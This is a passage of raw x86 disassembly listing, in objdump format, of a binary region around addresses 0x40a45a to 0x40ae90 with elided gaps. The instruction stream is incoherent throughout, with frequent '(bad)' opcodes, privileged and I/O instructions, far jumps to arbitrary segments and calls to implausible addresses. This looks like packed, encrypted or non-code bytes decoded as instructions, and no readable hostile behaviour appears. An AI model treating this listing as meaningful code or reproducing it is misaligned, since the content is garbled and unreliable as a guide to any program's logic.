  40a45a:	xor    BYTE PTR [edi+0x1a],dh
  40a45d:	mov    esp,0xc2c9a430
  40a462:	outs   dx,DWORD PTR ds:[esi]
  40a463:	push   edi
  40a464:	push   ebp
  40a465:	mov    eax,DWORD PTR [ebx-0x28]
  40a468:	ret    
  40a469:	cld    
  40a46a:	mov    ebp,0x50096a57
  40a46f:	and    al,BYTE PTR [edi]
  40a471:	call   0x3f8a99
  40a476:	into   
  40a477:	adc    bh,bl
  40a479:	push   0x4d
  40a47b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a47c:	jne    0x40a486
  40a47e:	jg     0x40a457
  40a480:	(bad)  
  40a481:	inc    DWORD PTR [eax]
  40a483:	cmc    
  40a484:	and    edi,edi
  40a486:	push   0x4f
  40a488:	call   0xffe29503
  40a48d:	push   0xfffffff3
  40a48f:	mov    eax,ds:0xf2af0875
  40a494:	std    
  40a495:	push   DWORD PTR [eax+0xfc75a1]
	...
  40a4c3:	add    BYTE PTR [esi],bh
  40a4c5:	jmp    0x4b56aca1
  40a4ca:	popf   
  40a4cb:	(bad)  
  40a4cc:	stc    
  40a4cd:	retf   
  40a4ce:	inc    eax
  40a4cf:	add    al,0x3e
  40a4d1:	addr16 mov ebp,esp
  40a4d4:	push   esp
  40a4d5:	hlt    
  40a4d6:	jmp    0x2368:0x4338936
  40a4dd:	rol    ebx,0xff
  40a4e0:	shl    BYTE PTR [edi+0x39],1
  40a4e3:	dec    eax
  40a4e4:	jg     0x40a4da
  40a4e6:	push   0xffffffd2
  40a4e8:	adc    BYTE PTR [ecx-0x3f81f4a2],0xf7
  40a4ef:	dec    edi
  40a4f0:	mov    cl,0xc7
  40a4f2:	repnz (bad) 
  40a4f4:	xor    edi,eax
  40a4f6:	mov    dl,0xfe
  40a4f8:	sub    edi,esp
  40a4fa:	push   0xffffff98
  40a4fc:	mov    ds:0xdfe85e39,al
  40a501:	jge    0x40a561
  40a503:	call   DWORD PTR [esp+esi*8]
  40a506:	jmp    0x2368:0x2b2e936
  40a50d:	loope  0x40a4d2
  40a50f:	(bad)  
  40a510:	fprem1 
  40a512:	add    al,BYTE PTR [eax]
  40a514:	mov    esi,0x61bea25c
  40a519:	icebp  
  40a51a:	or     al,al
  40a51c:	sar    dh,cl
  40a51e:	mov    dl,0xfe
  40a520:	retf   
  40a521:	add    ebx,DWORD PTR [ebp+esi*2+0x3a]
  40a525:	inc    esp
  40a526:	pop    ebp
  40a527:	jne    0x40a529
	...
  40a551:	add    BYTE PTR [esi],dh
  40a553:	sbb    al,0xeb
  40a555:	jecxz  0x40a590
  40a557:	sbb    DWORD PTR [edx+esi*2-0xb],ebp
  40a55b:	rcr    BYTE PTR [edi+edi*8-0x4d],0x24
  40a560:	pop    esp
  40a561:	jne    0x40a595
  40a563:	pushf  
  40a564:	stc    
  40a565:	push   esi
  40a566:	jg     0x40a5c3
  40a568:	jmp    0x919430c9
  40a56d:	and    BYTE PTR [edx],0x2
  40a570:	xchg   esi,eax
  40a571:	dec    ebx
  40a572:	cld    
  40a573:	dec    esi
  40a574:	jmp    0x6a2f6a2f
  40a579:	dec    eax
  40a57a:	bnd je 0x40a566
  40a57d:	jmp    0xc3ca7b9
  40a582:	(bad)  
  40a583:	(bad)  [eax]
  40a585:	pop    ebp
  40a586:	(bad)  
  40a588:	stos   DWORD PTR es:[edi],eax
  40a589:	pop    edi
  40a58a:	pop    bx
  40a58c:	jmp    0xefb32dfd
  40a591:	mov    ah,0x7e
  40a593:	pop    ebx
  40a594:	dec    esi
  40a595:	xlat   BYTE PTR ds:[ebx]
  40a596:	inc    ecx
  40a597:	repz enter 0xb15c,0x1
  40a59c:	rol    DWORD PTR [edx],1
  40a59e:	ds bnd jbe 0x40a58e
  40a5a2:	dec    esi
  40a5a3:	stos   BYTE PTR es:[edi],al
  40a5a4:	test   al,0x3
  40a5a6:	cdq    
  40a5a7:	xchg   ecx,esi
  40a5a9:	imul   eax,DWORD PTR [eax],0x2
  40a5ac:	push   ds
  40a5ad:	pop    ebp
  40a5ae:	mov    DWORD PTR [edi+0x530b5d15],eax
  40a5b4:	add    DWORD PTR [edi+0x0],esi
	...
  40a5df:	add    BYTE PTR [esi+0x7c4b0601],dh
  40a5e5:	push   esi
  40a5e6:	jmp    0x682f5aa1
  40a5eb:	dec    eax
  40a5ec:	xchg   BYTE PTR [ecx],cl
  40a5ee:	out    dx,al
  40a5ef:	pop    esp
  40a5f0:	retf   
  40a5f1:	xchg   edi,eax
  40a5f2:	in     eax,0xb3
  40a5f4:	push   eax
  40a5f5:	xchg   ebp,ebp
  40a5f7:	pop    esp
  40a5f8:	adc    ebp,DWORD PTR [eax]
  40a5fa:	and    ebx,eax
  40a5fc:	inc    ecx
  40a5fd:	stc    
  40a5fe:	add    ah,BYTE PTR [ebp+0x43f25b3e]
  40a604:	inc    ecx
  40a605:	(bad)  
  40a606:	mov    al,ds:0x5b3e02
  40a60b:	scas   al,BYTE PTR es:[edi]
  40a60c:	clc    
  40a60d:	or     BYTE PTR [eax],al
  40a60f:	jmp    0x2d080151
  40a614:	jbe    0x40a616
  40a616:	pop    es
  40a617:	jmp    0x3411b59
  40a61c:	cmp    dh,BYTE PTR [ebp+0x0]
  40a61f:	add    eax,DWORD PTR [edx-0x32]
  40a622:	inc    esp
  40a623:	jge    0x40a5d2
  40a625:	iret   
  40a626:	test   BYTE PTR [ebp-0x6e],dh
  40a629:	add    bh,bh
  40a62b:	sbb    DWORD PTR [ebx-0xf91077a],eax
  40a631:	add    al,0xe8
  40a633:	gs fwait
  40a635:	pop    ebx
  40a636:	add    dl,dh
  40a638:	jge    0x40a5c1
  40a63a:	add    eax,0x5a4640
  40a63f:	jmp    0xa88871e9
	...
  40a66c:	add    BYTE PTR [eax],al
  40a66e:	cmp    eax,0x15ed7500
  40a673:	mov    ?,WORD PTR [esi-0x7454fdca]
  40a679:	sbb    eax,ecx
  40a67b:	(bad)  
  40a67c:	repz push ds
  40a67e:	repnz dec DWORD PTR [edi-0x45]
  40a682:	adc    eax,0xe216be3e
  40a687:	rol    DWORD PTR [ecx+ebx*1+0x11ff0012],1
  40a68e:	out    dx,al
  40a68f:	(bad)  
  40a690:	(bad)  
  40a691:	(bad)  
  40a692:	push   esi
  40a693:	add    BYTE PTR [edi+0x5b],ah
  40a696:	stos   BYTE PTR es:[edi],al
  40a697:	fwait
  40a698:	add    dh,ch
  40a69a:	mov    bl,0xb
  40a69c:	mul    esi
  40a69e:	cmc    
  40a69f:	push   DWORD PTR [esp+esi*4]
  40a6a2:	jp     0x40a63f
  40a6a4:	add    cl,al
  40a6a6:	leave  
  40a6a7:	mov    ebp,0xd5cbcefe
  40a6ac:	jecxz  0x40a6ae
  40a6ae:	lock mov ds:0xf4176aff,eax
  40a6b4:	mov    ds:0xff575657,al
  40a6b9:	mov    ch,0xd7
  40a6bb:	stos   DWORD PTR es:[edi],eax
  40a6bc:	(bad)  
  40a6bd:	(bad)  
  40a6be:	fsubr  DWORD PTR [ecx-0x2b]
  40a6c1:	dec    eax
  40a6c2:	push   esi
  40a6c3:	push   edi
  40a6c4:	call   0xffe5113e
  40a6c9:	mov    DWORD PTR [edx+0x73],esp
  40a6cc:	idiv   edi
  40a6ce:	mov    eax,0x67fef0
	...
  40a6fb:	add    BYTE PTR [esp+ecx*8+0x3f],bl
  40a6ff:	add    BYTE PTR [eax-0x16],ch
  40a702:	out    dx,eax
  40a703:	imul   DWORD PTR [eax-0x5c]
  40a706:	push   DWORD PTR ds:0x400f12
  40a70c:	outs   dx,DWORD PTR ds:[esi]
  40a70d:	int3   
  40a70e:	mov    ebx,0x84ce68ff
  40a713:	call   0x6b404b28
  40a718:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a719:	rep stos DWORD PTR es:[edi],eax
  40a71b:	push   edi
  40a71c:	(bad)  
  40a71d:	pop    ebx
  40a71e:	push   DWORD PTR [ebp-0x5399]
  40a724:	push   0xe648d56a
  40a729:	pop    ebx
  40a72a:	call   0xffe49168
  40a72f:	mov    DWORD PTR [edx],edx
  40a731:	ja     0x40a72a
  40a733:	dec    DWORD PTR [eax-0x2e]
  40a736:	test   al,bl
  40a738:	jo     0x40a6de
  40a73a:	call   DWORD PTR [eax-0x31]
  40a73d:	in     al,dx
  40a73e:	push   esi
  40a73f:	inc    ecx
  40a740:	push   edi
  40a741:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a742:	mov    ch,0xf0
  40a744:	push   eax
  40a745:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a746:	(bad)  
  40a747:	push   DWORD PTR [edx]
  40a749:	dec    edx
  40a74a:	dec    eax
  40a74b:	inc    ecx
  40a74c:	push   edi
  40a74d:	jae    0x40a765
  40a74f:	mov    ebp,0xb5a293e
  40a754:	(bad)  
  40a755:	test   al,0xfd
  40a757:	xor    bl,0xbc
  40a75a:	push   ecx
  40a75b:	jmp    FWORD PTR [ecx]
  40a75d:	stc    
  40a75e:	iret   
  40a75f:	sldt   WORD PTR [eax]
	...
  40a78a:	and    DWORD PTR ds:0xc5fa858a,eax
  40a790:	pop    ecx
  40a791:	jmp    FWORD PTR [esi-0x14]
  40a794:	gs mov ecx,0x146dde09
  40a79a:	xor    eax,0x8e05ceb4
  40a79f:	fdiv   QWORD PTR [ecx]
  40a7a1:	mov    ecx,0x8541d5f1
  40a7a6:	or     al,BYTE PTR [esi-0xbb400a6]
  40a7ac:	add    al,BYTE PTR [eax]
  40a7ae:	mov    ebp,0xd1f75f2f
  40a7b3:	jne    0x40a7b8
  40a7b5:	je     0x40a81a
  40a7b7:	jno    0x40a751
  40a7b9:	in     al,dx
  40a7ba:	leave  
  40a7bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7bc:	pop    edx
  40a7bd:	add    BYTE PTR [edx],dh
  40a7bf:	mov    al,0x85
  40a7c1:	mov    ebp,0xff5a3da6
  40a7c6:	ds enter 0x67b5,0x3e
  40a7cb:	hlt    
  40a7cc:	imul   edi,DWORD PTR [esi-0x17f53867],0xff5a9de8
  40a7d6:	mov    DWORD PTR [edi+0x6581f767],esp
  40a7dc:	pop    edx
  40a7dd:	jne    0x40a825
  40a7df:	pop    esp
  40a7e0:	lods   eax,DWORD PTR ds:[esi]
  40a7e1:	mov    dh,0x71
  40a7e3:	push   ebp
  40a7e4:	pop    edx
  40a7e5:	mov    ch,0x56
  40a7e7:	add    eax,0x7f61ff59
  40a7ec:	or     ebp,eax
	...
  40a816:	add    BYTE PTR [eax],al
  40a818:	mov    edx,0x51ff5a46
  40a81d:	pop    ebx
  40a81e:	pushf  
  40a81f:	pusha  
  40a820:	push   ecx
  40a821:	(bad)  
  40a822:	fstp   QWORD PTR [ecx-0x35]
  40a825:	push   edx
  40a826:	ror    DWORD PTR [edx+0x59cdfdf0],0xeb
  40a82d:	cli    
  40a82e:	mov    ebp,0x33fe2959
  40a833:	or     al,0x16
  40a835:	fstp   TBYTE PTR [esi+0x59]
  40a838:	sbb    esi,edi
  40a83a:	jae    0x40a874
  40a83c:	or     esi,edi
  40a83e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a83f:	pop    ecx
  40a840:	xchg   ebx,eax
  40a841:	push   ebx
  40a842:	xchg   ecx,eax
  40a843:	hlt    
  40a844:	retf   
  40a845:	std    
  40a846:	xchg   ebp,eax
  40a847:	pop    ecx
  40a848:	mov    bl,0xf6
  40a84a:	xchg   ebp,eax
  40a84b:	pop    ecx
  40a84c:	icebp  
  40a84d:	repnz sbb al,0x9b
  40a850:	jmp    0xd2d02652
  40a855:	add    eax,0x93e65976
  40a85a:	xor    BYTE PTR [ecx-0x2f],bl
  40a85d:	std    
  40a85e:	fwait
  40a85f:	ins    BYTE PTR es:[edi],dx
  40a860:	sar    ebp,1
  40a862:	pop    ebp
  40a863:	ins    BYTE PTR es:[edi],dx
  40a864:	add    ah,al
  40a866:	push   ebp
  40a867:	pop    ecx
  40a868:	mov    ecx,0xb15148c7
  40a86d:	std    
  40a86e:	push   eax
  40a86f:	adc    eax,0x593dfde7
  40a874:	jmp    0x40a880
  40a876:	ds pop ecx
  40a878:	cdq    
  40a879:	repnz add BYTE PTR [ebx+0x0],bl
	...
  40a8a4:	add    BYTE PTR [eax],al
  40a8a6:	xchg   ecx,eax
  40a8a7:	std    
  40a8a8:	and    eax,0xd5f391bf
  40a8ad:	pop    ecx
  40a8ae:	cmp    ebp,0xf275cf15
  40a8b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8b5:	sahf   
  40a8b6:	ds pop ebx
  40a8b8:	xor    BYTE PTR [esi+0x36],al
  40a8bb:	pop    ebx
  40a8bc:	xchg   esp,eax
  40a8bd:	mov    WORD PTR [edx-0x27],ss
  40a8c0:	jmp    FWORD PTR [edx+edi*8]
  40a8c3:	jo     0x40a8c5
  40a8c5:	add    DWORD PTR [edx-0x2],0x74
  40a8c9:	icebp  
  40a8ca:	aad    0x40
  40a8cc:	mov    dh,0xde
  40a8ce:	out    0xd3,al
  40a8d0:	inc    esp
  40a8d1:	aad    0xc0
  40a8d3:	xchg   esi,eax
  40a8d4:	clc    
  40a8d5:	cmp    DWORD PTR [edx],esp
  40a8d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8d8:	push   edi
  40a8d9:	sub    BYTE PTR [edx+0x73],al
  40a8dc:	inc    ebx
  40a8dd:	push   ss
  40a8de:	std    
  40a8df:	cld    
  40a8e0:	std    
  40a8e1:	cld    
  40a8e2:	push   0xa5e94193
  40a8e7:	std    
  40a8e8:	mov    edx,0xc05066a6
  40a8ed:	adc    eax,0xe8688d0f
  40a8f2:	cmp    eax,0x8ebdec
  40a8f7:	add    eax,0x54f88650
  40a8fc:	call   0xff3cd072
  40a901:	or     DWORD PTR [edx-0x4791013d],0xb9f896
	...
  40a933:	add    ch,dl
  40a935:	jbe    0x40a98e
  40a937:	test   al,0x3d
  40a939:	jae    0x40a97e
  40a93b:	mov    esi,0x14fdfc7c
  40a940:	popa   
  40a941:	xchg   ebx,eax
  40a942:	inc    ecx
  40a943:	jmp    0x3efbba5d
  40a948:	push   es
  40a949:	push   eax
  40a94a:	sar    BYTE PTR [ebp-0x14977372],0x3d
  40a951:	in     al,dx
  40a952:	mov    ebp,0x50047826
  40a957:	push   ds
  40a958:	jo     0x40a9ae
  40a95a:	call   0xff3ce11c
  40a95f:	add    esi,ebp
  40a961:	ret    0xfe
  40a964:	inc    eax
  40a965:	lock je 0x40a9bf
  40a968:	xchg   esi,eax
  40a969:	pop    eax
  40a96a:	push   DWORD PTR [ebp+0x5f]
  40a96d:	jo     0x40a9e6
  40a96f:	std    
  40a970:	pusha  
  40a971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a972:	push   DWORD PTR [ebp+0x63]
  40a975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a976:	jne    0x40a980
  40a978:	outs   dx,DWORD PTR ds:[esi]
  40a979:	mov    ds:0x8e10ffb5,al
  40a97e:	ret    0x2704
  40a981:	retf   
  40a982:	mov    esp,ebp
  40a984:	xchg   esi,eax
  40a985:	fdivr  st(7),st
  40a988:	loopne 0x40a92d
  40a98a:	lea    eax,[ebp-0x2d]
  40a98d:	(bad)  
  40a98e:	std    
  40a98f:	jne    0x40a984
  40a991:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a992:	xor    eax,0xff164fd5
  40a997:	out    0x0,eax
	...
  40a9c1:	add    BYTE PTR [ebp-0x23000045],al
  40a9c7:	xchg   edi,eax
  40a9c8:	jne    0x40ff74
  40a9ce:	cwde   
  40a9cf:	sbb    edi,esi
  40a9d1:	add    bh,dl
  40a9d3:	push   edi
  40a9d4:	add    bh,al
  40a9d6:	sub    ch,BYTE PTR [ebx+0x57e707ff]
  40a9dc:	push   0x0
  40a9de:	in     eax,dx
  40a9df:	push   edi
  40a9e0:	push   0x0
  40a9e2:	in     eax,dx
  40a9e3:	push   edi
  40a9e4:	lea    eax,[ebp+0x1b]
  40a9e7:	(bad)  
  40a9e8:	mov    eax,DWORD PTR [ebp-0x73f5]
  40a9ee:	(bad)  
  40a9ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9f0:	jne    0x40a9ea
  40a9f2:	pusha  
  40a9f3:	sub    bh,bl
  40a9f5:	call   0x408585
  40a9fa:	pushf  
  40a9fb:	xchg   edi,eax
  40a9fc:	je     0x40aa03
  40a9fe:	fild   DWORD PTR cs:[eax]
  40aa01:	add    BYTE PTR [edi+0x3e48afef],dl
  40aa07:	mov    bl,0x2
  40aa09:	(bad)  
  40aa0a:	jmp    0x40aa29
  40aa0c:	imul   esi,DWORD PTR [ebp+0x505754a5],0xffffffb5
  40aa13:	popa   
  40aa14:	mov    DWORD PTR [ebp-0xaa03ae],eax
  40aa1a:	out    dx,al
  40aa1b:	fild   QWORD PTR [edx-0x5b]
  40aa1e:	test   esp,esi
  40aa20:	push   ebp
  40aa21:	mov    DWORD PTR [ebx+0xff4e21],edi
	...
  40aa4f:	add    BYTE PTR [ecx],bh
  40aa51:	sbb    eax,0x2a31b75a
  40aa56:	jmp    0xae164c5a
  40aa5b:	inc    eax
  40aa5c:	ds mov ecx,0xb211f08f
  40aa62:	push   ebp
  40aa63:	dec    DWORD PTR [ebx-0x31]
  40aa66:	retf   0x3e40
  40aa69:	int3   
  40aa6a:	pop    ecx
  40aa6b:	mov    edx,0x858bda01
  40aa70:	loop   0x40aa4b
  40aa72:	push   ebp
  40aa73:	jmp    DWORD PTR [esp+eax*1-0x15]
  40aa77:	mov    ebx,0xff044391
  40aa7c:	stos   DWORD PTR es:[edi],eax
  40aa7d:	je     0x40aacd
  40aa7f:	(bad)  
  40aa80:	fnstenv [ecx+0x10]
  40aa83:	aad    0x86
  40aa85:	inc    ebx
  40aa86:	add    al,0xe8
  40aa88:	jmp    0x40aa48
  40aa8a:	push   ebp
  40aa8b:	push   DWORD PTR [edi-0x46089881]
  40aa91:	xchg   ecx,eax
  40aa92:	jmp    0xae7fc496
  40aa97:	inc    eax
  40aa98:	mov    eax,ds:0x39a9f090
  40aa9e:	push   esi
  40aa9f:	call   DWORD PTR [ebx+0x57]
  40aaa2:	retf   
  40aaa3:	inc    eax
  40aaa4:	ds pushf 
  40aaa6:	xchg   esi,eax
  40aaa7:	mov    edx,0x8c265b89
  40aaac:	mov    ebx,0x795615fb
  40aab1:	test   ecx,ebp
  40aab3:	jmp    0x40aab5
	...
  40aadd:	add    BYTE PTR [edi+0x6903a892],al
  40aae3:	mov    al,0xf8
  40aae5:	dec    ebp
  40aae6:	popa   
  40aae7:	cli    
  40aae8:	std    
  40aae9:	(bad)  
  40aaeb:	mov    ds:0xbc6603a8,eax
  40aaf0:	xor    dl,BYTE PTR [esi+0x49]
  40aaf3:	in     al,0x6b
  40aaf5:	ins    BYTE PTR es:[edi],dx
  40aaf6:	dec    ecx
  40aaf7:	cli    
  40aaf8:	fucomp st(2)
  40aafa:	cmp    DWORD PTR [edx+0x5b7eadb5],eax
  40ab00:	into   
  40ab01:	(bad)  
  40ab02:	repnz lds edx,FWORD PTR cs:[ebp+0x21]
  40ab07:	xor    BYTE PTR [esp+ecx*8-0x7e3ea482],dl
  40ab0e:	aam    0xf9
  40ab10:	lods   eax,DWORD PTR ds:[esi]
  40ab11:	mov    eax,ebx
  40ab13:	push   ss
  40ab14:	sahf   
  40ab15:	push   ebp
  40ab16:	add    esi,ebx
  40ab18:	pop    ebx
  40ab19:	pusha  
  40ab1a:	icebp  
  40ab1b:	stc    
  40ab1c:	xchg   ebp,eax
  40ab1d:	add    al,0x6a
  40ab1f:	sub    BYTE PTR [edx-0x69],0xda
  40ab23:	icebp  
  40ab24:	test   DWORD PTR [ebp+0x3e],edx
  40ab27:	outs   dx,DWORD PTR ds:[esi]
  40ab28:	sbb    eax,0x7e029b81
  40ab2d:	push   ebp
  40ab2e:	rcr    DWORD PTR [edx-0xb],1
  40ab31:	mov    al,0x61
  40ab33:	pop    ebx
  40ab34:	jmp    0xd43a2b9d
  40ab39:	or     esp,DWORD PTR [esi-0x4eaa65f8]
  40ab3f:	stc    
  40ab40:	xchg   ebx,eax
  40ab41:	push   0x0
	...
  40ab6a:	add    BYTE PTR [eax],al
  40ab6c:	mov    cl,0xf9
  40ab6e:	inc    ebp
  40ab6f:	push   ebp
  40ab70:	sub    esp,DWORD PTR [ebx+0x51]
  40ab73:	ret    0xf9cd
  40ab76:	push   DWORD PTR ds:0x36e7afeb
  40ab7c:	repz stc 
  40ab7e:	(bad)  
  40ab7f:	pushf  
  40ab80:	xor    eax,0x13553403
  40ab85:	cli    
  40ab86:	(bad)  
  40ab87:	pop    esp
  40ab88:	fdivrp st(1),st
  40ab8a:	dec    BYTE PTR [esi]
  40ab8c:	adc    esi,DWORD PTR [eax+0x8]
  40ab8f:	adc    DWORD PTR [eax-0x51],eax
  40ab92:	(bad)  
  40ab93:	(bad)  
  40ab94:	repnz scas eax,DWORD PTR es:[edi]
  40ab96:	(bad)  
  40ab98:	jmp    0x1803:0x3574fef9
  40ab9f:	popf   
  40aba0:	jmp    0xfef0:0x7194fef9
  40aba7:	(bad)  
  40aba8:	mov    ch,BYTE PTR [esi+0x8]
  40abab:	shl    DWORD PTR [edi],0xaf
  40abae:	inc    dh
  40abb0:	mov    ch,BYTE PTR [esi-0x78d491d]
  40abb6:	out    0xc5,eax
  40abb8:	ret    
  40abb9:	clc    
  40abba:	(bad)  
  40abbb:	scas   al,BYTE PTR es:[edi]
  40abbc:	mov    eax,0x6aa6f707
  40abc1:	add    esp,ecx
  40abc3:	push   edi
  40abc4:	xchg   edx,eax
  40abc5:	clc    
  40abc6:	(bad)  
  40abc7:	pop    esp
  40abc8:	lock dec BYTE PTR gs:[esi-0x7949eeab]
	...
  40abf8:	add    BYTE PTR [eax],al
  40abfa:	mov    bh,al
  40abfc:	mov    ah,0x89
  40abfe:	mov    bh,al
  40ac00:	inc    BYTE PTR [ecx+0x6efeb186]
  40ac06:	jb     0x40abb6
  40ac08:	fistp  DWORD PTR [esi+0x6a]
  40ac0b:	clc    
  40ac0c:	out    0x29,eax
  40ac0e:	retf   
  40ac0f:	clc    
  40ac10:	(bad)  
  40ac11:	push   esi
  40ac12:	shr    bl,0xf6
  40ac15:	dec    esi
  40ac16:	adc    bh,al
  40ac18:	je     0x40ac1a
  40ac1a:	scas   eax,DWORD PTR es:[edi]
  40ac1b:	test   BYTE PTR [edi],dh
  40ac1d:	(bad)  
  40ac1e:	pop    eax
  40ac1f:	(bad)  
  40ac20:	push   DWORD PTR [ebp-0x58a9]
  40ac26:	call   esi
  40ac28:	mov    ch,0xff
  40ac2a:	pop    eax
  40ac2b:	pop    DWORD PTR [ebp-0x8]
  40ac2e:	dec    esi
  40ac2f:	push   ds
  40ac30:	std    
  40ac31:	dec    DWORD PTR [eax-0x71]
  40ac34:	jne    0x40ac32
  40ac36:	aas    
  40ac37:	fwait
  40ac38:	mov    ds:0xc2a55700,al
  40ac3d:	or     BYTE PTR [edi-0x37],ah
  40ac40:	mov    esp,ebp
  40ac42:	in     al,0x37
  40ac44:	cld    
  40ac45:	push   0x57
  40ac47:	add    cl,BYTE PTR [ebx]
  40ac49:	jmp    edx
  40ac4b:	mul    dh
  40ac4d:	mov    ecx,0x89ff8bd4
  40ac52:	bound  ecx,QWORD PTR [ebx+0x1e70e868]
  40ac58:	(bad)  
  40ac59:	(bad)  
  40ac5a:	(bad)  
  40ac5b:	mul    esi
  40ac5d:	test   BYTE PTR [eax],0x0
	...
  40ac88:	fimul  DWORD PTR [ebx-0x74ad0001]
  40ac8e:	push   DWORD PTR [ebp+0x1f]
  40ac91:	xchg   esp,eax
  40ac92:	in     al,0xb3
  40ac94:	fmul   DWORD PTR [ebx+0x5be3c2c9]
  40ac9a:	push   ebp
  40ac9b:	mov    edi,DWORD PTR [ebx-0x2f2f3c23]
  40aca1:	mov    edi,edi
  40aca3:	lea    edx,[edx]
  40aca5:	mov    edx,DWORD PTR [eax-0x1]
  40aca8:	shl    bh,cl
  40acaa:	std    
  40acab:	xor    eax,0x3fb6b2
  40acb0:	mov    edi,0xd700a125
  40acb5:	clc    
  40acb6:	mov    esi,0x269220f
  40acbb:	add    BYTE PTR [esi],bh
  40acbd:	add    cl,BYTE PTR [edx+0x45]
  40acc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acc1:	add    DWORD PTR [ebx],eax
  40acc3:	add    BYTE PTR [esi],bh
  40acc5:	dec    ecx
  40acc6:	leave  
  40acc7:	repz cdq 
  40acc9:	add    BYTE PTR [ebx],al
  40accb:	add    BYTE PTR [edx+eax*1],ah
  40acce:	(bad)  
  40acd0:	pop    ss
  40acd1:	add    bl,ch
  40acd3:	push   DWORD PTR [edx-0x34afa93a]
  40acd9:	jle    0x40ad33
  40acdb:	div    DWORD PTR [ecx+0x50]
  40acde:	mov    ah,0xfe
  40ace0:	repz dec ecx
  40ace2:	push   ebx
  40ace3:	jne    0x40ad47
  40ace5:	dec    ecx
  40ace6:	mov    edi,0xfe023ea1
  40aceb:	mov    edi,0x0
	...
  40ad14:	add    BYTE PTR [eax],al
  40ad16:	retf   0x5c06
  40ad19:	std    
  40ad1a:	aas    
  40ad1b:	add    al,BYTE PTR [ebx]
  40ad1d:	push   0xffc5298f
  40ad22:	cmp    BYTE PTR [eax-0x342d1800],dl
  40ad28:	push   ecx
  40ad29:	push   DWORD PTR [ebp+0x2a857fb4]
  40ad2f:	mov    dh,0x51
  40ad31:	jmp    FWORD PTR [esi+0x52]
  40ad34:	pop    esp
  40ad35:	loope  0x40ad0e
  40ad37:	lods   eax,DWORD PTR ds:[esi]
  40ad38:	push   ecx
  40ad39:	mov    ebx,eax
  40ad3b:	mov    ah,0x59
  40ad3d:	inc    DWORD PTR [ecx]
  40ad3f:	dec    ebx
  40ad40:	add    al,0x68
  40ad42:	sbb    BYTE PTR [ebp+eax*8+0x5397f0ff],0xf7
  40ad4a:	jmp    0xb75ff34
  40ad4f:	sub    eax,0xcce1ffc5
  40ad54:	mov    bh,bh
  40ad56:	sar    DWORD PTR [ebx-0x78],1
  40ad59:	in     al,0xd1
  40ad5b:	test   DWORD PTR [edx+0x6a],edx
  40ad5e:	ds pop ebx
  40ad60:	rcr    DWORD PTR [eax],1
  40ad62:	push   ss
  40ad63:	pushf  
  40ad64:	jmp    0x5e2c98bb
  40ad69:	push   edx
  40ad6a:	test   eax,0xf63913f6
  40ad6f:	fwait
  40ad70:	jmp    0x3df431d0
  40ad75:	push   edx
  40ad76:	(bad)  
  40ad77:	loopne 0x40adbd
  40ad79:	pop    edx
	...
  40ada2:	add    BYTE PTR [eax],al
  40ada4:	mov    esi,esi
  40ada6:	ret    0x1603
  40ada9:	xor    ecx,eax
  40adab:	les    edi,FWORD PTR [ecx-0xb]
  40adae:	push   ebx
  40adaf:	push   ebx
  40adb0:	imul   esi,esi,0x10335215
  40adb6:	mov    eax,ds:0x54fe61c4
  40adbb:	mov    ebx,DWORD PTR [ecx-0xa]
  40adbe:	outs   dx,DWORD PTR ds:[esi]
  40adbf:	mov    BYTE PTR [esi-0x12],ah
  40adc2:	cmc    
  40adc3:	push   ecx
  40adc4:	aam    0x5a
  40adc6:	or     edx,0x50e99be9
  40adcc:	repz jmp 0x371b:0xf63151d5
  40add4:	jbe    0x40ad72
  40add6:	jmp    0xc5f35e36
  40addb:	push   ecx
  40addc:	(bad)  
  40addd:	(bad)  
  40addf:	pop    ecx
  40ade0:	adc    esi,esi
  40ade2:	arpl   WORD PTR [edi+0x51adedf2],ax
  40ade8:	outs   dx,BYTE PTR ds:[esi]
  40ade9:	and    esi,0xffffffab
  40adec:	jle    0x40ae49
  40adee:	sahf   
  40adef:	xchg   edi,eax
  40adf0:	out    dx,al
  40adf1:	in     eax,dx
  40adf2:	xchg   ebp,eax
  40adf3:	push   ecx
  40adf4:	jmp    0x7efd6228
  40adf9:	pop    ebx
  40adfa:	xchg   ecx,eax
  40adfb:	fst    QWORD PTR [ecx-0x6e02820b]
  40ae01:	outs   dx,BYTE PTR ds:[esi]
  40ae02:	add    al,dl
  40ae04:	ret    0xd3b7
  40ae07:	jbe    0x40ae09
	...
  40ae31:	add    BYTE PTR [edi-0xa],ch
  40ae34:	add    ebx,esp
  40ae36:	lods   eax,DWORD PTR ds:[esi]
  40ae37:	hlt    
  40ae38:	das    
  40ae39:	outs   dx,BYTE PTR ds:[esi]
  40ae3a:	mov    ecx,0xf56f716
  40ae3f:	mov    ebp,eax
  40ae41:	adc    ecx,ecx
  40ae43:	cmc    
  40ae44:	(bad)  
  40ae45:	push   edx
  40ae46:	xchg   esi,eax
  40ae47:	pusha  
  40ae48:	shl    BYTE PTR [ebp+0x5e88b47],0xb1
  40ae4f:	cmc    
  40ae50:	(bad)  
  40ae51:	es mov ecx,0xf26f716
  40ae57:	push   eax
  40ae58:	add    cl,ch
  40ae5a:	cmp    eax,0x73984e8
  40ae5f:	idiv   dh
  40ae61:	mov    ecx,0xa858a185
  40ae66:	cmp    eax,0xf6f9b4f6
  40ae6b:	cmc    
  40ae6c:	(bad)  
  40ae6d:	div    BYTE PTR [eax]
  40ae6f:	adc    BYTE PTR [eax-0x58],cl
  40ae72:	cmp    eax,0x8ea11d03
  40ae77:	hlt    
  40ae78:	mov    BYTE PTR [ebp+eiz*2-0x14],ah
  40ae7c:	(bad)  
  40ae7d:	(bad)  
  40ae7e:	ret    0xe3b6
  40ae81:	(bad)  
  40ae82:	mov    ?,esp
  40ae84:	push   ebp
  40ae86:	rcl    eax,0xff
  40ae89:	call   0xc5fd86cb
  40ae8e:	data16 hlt 
  40ae90:	(bad)  
